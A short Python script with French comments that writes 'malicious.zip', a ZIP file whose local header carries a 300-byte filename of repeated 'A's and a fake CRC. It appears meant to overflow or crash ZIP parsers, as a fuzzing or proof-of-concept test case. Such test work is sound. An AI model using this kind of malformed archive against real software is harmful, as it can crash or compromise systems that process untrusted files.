import struct

# Constantes ZIP
LOCAL_FILE_HEADER_SIGNATURE = 0x04034b50
VERSION = 20
FLAGS = 0
COMPRESSION = 0  # Pas de compression
MOD_TIME = 0
MOD_DATE = 0
CRC32 = 0x12345678
COMPRESSED_SIZE = 10
UNCOMPRESSED_SIZE = 10
EXTRA_LENGTH = 0

# Nom de fichier trop long (300 octets)
filename = b"A" * 300  

# Données factices du fichier
file_data = b"EXEMPLE123"

# Construction du Local File Header
header = struct.pack(
    "<IHHHHHIIIHH",
    LOCAL_FILE_HEADER_SIGNATURE,
    VERSION,
    FLAGS,
    COMPRESSION,
    MOD_TIME,
    MOD_DATE,
    CRC32,
    COMPRESSED_SIZE,
    UNCOMPRESSED_SIZE,
    len(filename),
    EXTRA_LENGTH
)

# Création du fichier ZIP malveillant
with open("malicious.zip", "wb") as f:
    f.write(header)
    f.write(filename)
    f.write(file_data)

print("Fichier ZIP malveillant 'malicious.zip' généré avec succès.")
